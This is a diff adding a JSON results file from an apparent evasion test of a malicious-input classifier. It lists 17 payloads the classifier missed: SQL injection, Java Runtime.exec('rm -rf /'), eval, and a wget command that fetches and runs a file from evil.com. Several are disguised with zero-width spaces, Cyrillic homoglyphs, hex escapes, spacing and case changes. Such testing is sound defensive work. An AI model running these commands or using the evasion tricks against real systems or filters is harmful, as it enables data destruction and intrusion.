@@ -1,0 +1,442 @@
+{
+  "total_tested": 111,
+  "successful_bypasses": 17,
+  "bypass_rate": 15.315315315315313,
+  "transformation_stats": {
+    "original": 7,
+    "encoding": 3,
+    "whitespace": 6,
+    "case": 1
+  },
+  "bypasses_by_transformation": {
+    "original": [
+      {
+        "text": "UNION SELECT null, null, null FROM information_schema.tables",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.5510690808296204,
+        "original_text": "UNION SELECT null, null, null FROM information_schema.tables"
+      },
+      {
+        "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.5073550939559937,
+        "original_text": "java.lang.Runtime.getRuntime().exec('rm -rf /')"
+      },
+      {
+        "text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.9160397052764893,
+        "original_text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables"
+      },
+      {
+        "text": "UNION\u200b SELECT null, null, null FROM information_schema.tables",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.5020179152488708,
+        "original_text": "UNION\u200b SELECT null, null, null FROM information_schema.tables"
+      },
+      {
+        "text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.7128201127052307,
+        "original_text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')"
+      },
+      {
+        "text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.6852422952651978,
+        "original_text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')"
+      },
+      {
+        "text": "UnIoN SELECT null, null, null FROM information_schema.tables",
+        "transformation": "original",
+        "predicted_label": 0,
+        "confidence": 0.5785974860191345,
+        "original_text": "UnIoN SELECT null, null, null FROM information_schema.tables"
+      }
+    ],
+    "encoding": [
+      {
+        "text": "java.lang.Runtime.getRuntime().exec('rm\u200b\\x20-rf\\x20/')",
+        "transformation": "encoding",
+        "predicted_label": 0,
+        "confidence": 0.6537825465202332,
+        "original_text": "java.lang.Runtime.getRuntime().exec('rm\u200b -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5223498940467834
+      },
+      {
+        "text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+        "transformation": "encoding",
+        "predicted_label": 0,
+        "confidence": 0.6024070978164673,
+        "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5824992656707764
+      },
+      {
+        "text": "j\u0430va.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+        "transformation": "encoding",
+        "predicted_label": 0,
+        "confidence": 0.6341869831085205,
+        "original_text": "j\u0430va.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5494194626808167
+      }
+    ],
+    "whitespace": [
+      {
+        "text": "java.lang.Runtime.getRuntime().exec('rm\u200b  -rf  /')",
+        "transformation": "whitespace",
+        "predicted_label": 0,
+        "confidence": 0.6808397173881531,
+        "original_text": "java.lang.Runtime.getRuntime().exec('rm\u200b -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5223498940467834
+      },
+      {
+        "text": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+        "transformation": "whitespace",
+        "predicted_label": 0,
+        "confidence": 0.6333592534065247,
+        "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5824992656707764
+      },
+      {
+        "text": "UNION  SELECT  null,  null,  null  FROM  inform\u0430tion_schema.tables",
+        "transformation": "whitespace",
+        "predicted_label": 0,
+        "confidence": 0.7285863161087036,
+        "original_text": "UNION SELECT null, null, null FROM inform\u0430tion_schema.tables",
+        "original_prediction": 1,
+        "original_confidence": 0.7877684831619263
+      },
+      {
+        "text": "eval('malicious    code')",
+        "transformation": "whitespace",
+        "predicted_label": 0,
+        "confidence": 0.5055451393127441,
+        "original_text": "eval('malicious  code')",
+        "original_prediction": 1,
+        "original_confidence": 0.7206394672393799
+      },
+      {
+        "text": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x",
+        "transformation": "whitespace",
+        "predicted_label": 0,
+        "confidence": 0.9240821599960327,
+        "original_text": "wget  http://evil.com/exploit  -O  /tmp/x  &&  chmod  +x  /tmp/x  &&  /tmp/x",
+        "original_prediction": 1,
+        "original_confidence": 0.9825583696365356
+      },
+      {
+        "text": "j\u0430va.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+        "transformation": "whitespace",
+        "predicted_label": 0,
+        "confidence": 0.6640448570251465,
+        "original_text": "j\u0430va.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5494194626808167
+      }
+    ],
+    "case": [
+      {
+        "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "transformation": "case",
+        "predicted_label": 0,
+        "confidence": 0.5073550939559937,
+        "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+        "original_prediction": 1,
+        "original_confidence": 0.5824992656707764
+      }
+    ]
+  },
+  "all_bypasses": [
+    {
+      "text": "UNION SELECT null, null, null FROM information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5510690808296204,
+      "original_text": "UNION SELECT null, null, null FROM information_schema.tables"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5073550939559937,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm -rf /')"
+    },
+    {
+      "text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.9160397052764893,
+      "original_text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\u200b\\x20-rf\\x20/')",
+      "transformation": "encoding",
+      "predicted_label": 0,
+      "confidence": 0.6537825465202332,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm\u200b -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5223498940467834
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\u200b  -rf  /')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.6808397173881531,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm\u200b -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5223498940467834
+    },
+    {
+      "text": "UNION\u200b SELECT null, null, null FROM information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5020179152488708,
+      "original_text": "UNION\u200b SELECT null, null, null FROM information_schema.tables"
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "transformation": "encoding",
+      "predicted_label": 0,
+      "confidence": 0.6024070978164673,
+      "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5824992656707764
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "transformation": "case",
+      "predicted_label": 0,
+      "confidence": 0.5073550939559937,
+      "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5824992656707764
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.6333592534065247,
+      "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5824992656707764
+    },
+    {
+      "text": "UNION  SELECT  null,  null,  null  FROM  inform\u0430tion_schema.tables",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.7285863161087036,
+      "original_text": "UNION SELECT null, null, null FROM inform\u0430tion_schema.tables",
+      "original_prediction": 1,
+      "original_confidence": 0.7877684831619263
+    },
+    {
+      "text": "eval('malicious    code')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.5055451393127441,
+      "original_text": "eval('malicious  code')",
+      "original_prediction": 1,
+      "original_confidence": 0.7206394672393799
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.7128201127052307,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.6852422952651978,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')"
+    },
+    {
+      "text": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.9240821599960327,
+      "original_text": "wget  http://evil.com/exploit  -O  /tmp/x  &&  chmod  +x  /tmp/x  &&  /tmp/x",
+      "original_prediction": 1,
+      "original_confidence": 0.9825583696365356
+    },
+    {
+      "text": "j\u0430va.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "transformation": "encoding",
+      "predicted_label": 0,
+      "confidence": 0.6341869831085205,
+      "original_text": "j\u0430va.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5494194626808167
+    },
+    {
+      "text": "j\u0430va.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.6640448570251465,
+      "original_text": "j\u0430va.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5494194626808167
+    },
+    {
+      "text": "UnIoN SELECT null, null, null FROM information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5785974860191345,
+      "original_text": "UnIoN SELECT null, null, null FROM information_schema.tables"
+    }
+  ],
+  "sample_bypasses": [
+    {
+      "text": "UNION SELECT null, null, null FROM information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5510690808296204,
+      "original_text": "UNION SELECT null, null, null FROM information_schema.tables"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5073550939559937,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm -rf /')"
+    },
+    {
+      "text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.9160397052764893,
+      "original_text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\u200b\\x20-rf\\x20/')",
+      "transformation": "encoding",
+      "predicted_label": 0,
+      "confidence": 0.6537825465202332,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm\u200b -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5223498940467834
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\u200b  -rf  /')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.6808397173881531,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm\u200b -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5223498940467834
+    },
+    {
+      "text": "UNION\u200b SELECT null, null, null FROM information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5020179152488708,
+      "original_text": "UNION\u200b SELECT null, null, null FROM information_schema.tables"
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "transformation": "encoding",
+      "predicted_label": 0,
+      "confidence": 0.6024070978164673,
+      "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5824992656707764
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "transformation": "case",
+      "predicted_label": 0,
+      "confidence": 0.5073550939559937,
+      "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5824992656707764
+    },
+    {
+      "text": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.6333592534065247,
+      "original_text": "jAvA.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5824992656707764
+    },
+    {
+      "text": "UNION  SELECT  null,  null,  null  FROM  inform\u0430tion_schema.tables",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.7285863161087036,
+      "original_text": "UNION SELECT null, null, null FROM inform\u0430tion_schema.tables",
+      "original_prediction": 1,
+      "original_confidence": 0.7877684831619263
+    },
+    {
+      "text": "eval('malicious    code')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.5055451393127441,
+      "original_text": "eval('malicious  code')",
+      "original_prediction": 1,
+      "original_confidence": 0.7206394672393799
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.7128201127052307,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.6852422952651978,
+      "original_text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')"
+    },
+    {
+      "text": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.9240821599960327,
+      "original_text": "wget  http://evil.com/exploit  -O  /tmp/x  &&  chmod  +x  /tmp/x  &&  /tmp/x",
+      "original_prediction": 1,
+      "original_confidence": 0.9825583696365356
+    },
+    {
+      "text": "j\u0430va.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "transformation": "encoding",
+      "predicted_label": 0,
+      "confidence": 0.6341869831085205,
+      "original_text": "j\u0430va.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5494194626808167
+    },
+    {
+      "text": "j\u0430va.lang.Runtime.getRuntime().exec('rm  -rf  /')",
+      "transformation": "whitespace",
+      "predicted_label": 0,
+      "confidence": 0.6640448570251465,
+      "original_text": "j\u0430va.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "original_prediction": 1,
+      "original_confidence": 0.5494194626808167
+    },
+    {
+      "text": "UnIoN SELECT null, null, null FROM information_schema.tables",
+      "transformation": "original",
+      "predicted_label": 0,
+      "confidence": 0.5785974860191345,
+      "original_text": "UnIoN SELECT null, null, null FROM information_schema.tables"
+    }
+  ]
+}
